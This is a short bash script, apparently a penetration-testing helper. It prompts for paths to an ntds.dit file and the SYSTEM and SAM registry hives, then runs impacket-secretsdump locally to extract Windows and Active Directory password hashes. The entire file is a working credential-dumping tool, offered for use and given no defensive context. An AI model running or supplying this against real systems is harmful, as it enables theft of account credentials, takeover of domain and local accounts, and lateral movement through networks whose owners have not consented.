#!/bin/bash
BOLD="\033[1m"
RED="\033[31m"
RESET="\033[0m"

echo -e "${BOLD}${RED}wow !  Local dumping of hashes ---<${RESET}"

 
echo "ntds.dit file Path: "
read ntds

echo "system file Path : "
read sys

echo "sam file Path"
read sam

impacket-secretsdump -ntds $ntds -system $sys -sam $sam  local 
